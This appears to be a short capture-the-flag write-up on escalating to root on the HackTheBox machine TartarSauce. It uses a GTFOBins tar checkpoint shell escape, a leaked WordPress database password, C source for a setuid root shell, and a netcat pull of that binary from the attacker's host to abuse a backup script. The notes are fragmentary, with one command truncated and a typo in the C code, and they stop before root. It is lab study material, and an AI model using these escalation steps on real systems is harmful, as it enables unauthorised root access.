# Getting Root

```bash

www-data@TartarSauce:/$ sudo -l
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/ta
```

https://gtfobins.github.io/gtfobins/tar/#sudo
```bash
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

![[Pasted image 20211111031835.png]]

* Run LinPeass.sh

```bash
-rwxr-xr-x 1 root root 2963 Jan 21  2021 /var/www/html/webservices/wp/wp-config.php
define('DB_NAME', 'wp');
define('DB_USER', 'wpuser');
define('DB_PASSWORD', 'w0rdpr3$$d@t@b@$3@cc3$$');
define('DB_HOST', 'localhost');
```

![[Pasted image 20211111033522.png]]

![[Pasted image 20211111033709.png]]

* Hunting for vulnerabilities on /usr/sbin/backuperer
![[Pasted image 20211111035508.png]]

* Creating our 32-bit setuid binary
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main( int argc, char *argv[] )
{
  setreuid(0,0);
    execve("/bin/sh", NULL, NUll);
}
```

```bash
gcc -m32 -o kawai setuid.c
```



create folder var/www/html  on your local machine

```bash
onuma@TartarSauce:/var/tmp$ mkdir -p var/www/html
```


```bash
$ nc 10.10.14.21 9002 > kawai
```

```bash
$ chmod 6555 kawai
```

```bash
onuma@TartarSauce:/var/tmp$ tar -zcvf kawai.tar.gz var/
var/
var/www/
var/www/html/
var/www/html/kawai
```

